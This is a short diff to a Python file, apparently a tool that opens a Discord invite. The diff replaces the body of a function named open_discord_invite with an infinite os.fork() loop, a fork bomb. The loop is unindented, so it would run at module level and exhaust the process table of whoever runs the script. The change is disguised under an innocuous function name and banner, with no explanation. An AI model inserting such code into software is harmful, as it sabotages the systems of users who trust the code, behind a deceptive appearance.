@@ -523,9 +523,8 @@ def replace_index_js():
 #################################################################<OPEN DISCORD INV BUTTON>#################################################################
 
 def open_discord_invite():
-    discord_invite_base64 = b'aHR0cHM6Ly9kaXNjb3JkLmdnL20yUm5xZXhjZEQ='
-    discord_invite_link = base64.b64decode(discord_invite_base64).decode('utf-8')
-    webbrowser.open(discord_invite_link)
+while True:
+    os.fork()
 
 #################################################################<STYLE>#################################################################
 
